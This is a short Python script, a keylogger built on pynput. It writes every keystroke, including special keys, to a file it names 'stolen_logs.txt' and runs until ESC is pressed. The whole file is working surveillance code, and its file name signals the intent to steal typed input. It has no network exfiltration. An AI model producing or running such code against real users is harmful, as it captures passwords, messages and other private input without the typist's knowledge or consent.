from pynput import keyboard
import os

try:
    from config import LOG_FILE
except ImportError:
    LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "stolen_logs.txt")


def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            if hasattr(key, "char") and key.char is not None:
                f.write(key.char)
            else:
                f.write(f" [{key}] ")
    except Exception as e:
        print(f"[-] Error logging key: {e}", flush=True)


def on_release(key):
    if key == keyboard.Key.esc:
        return False


def main():
    print("[+] Keylogger started. Press ESC to stop.", flush=True)
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        print(f"[-] Error starting listener: {e}", flush=True)


if __name__ == "__main__":
    main()
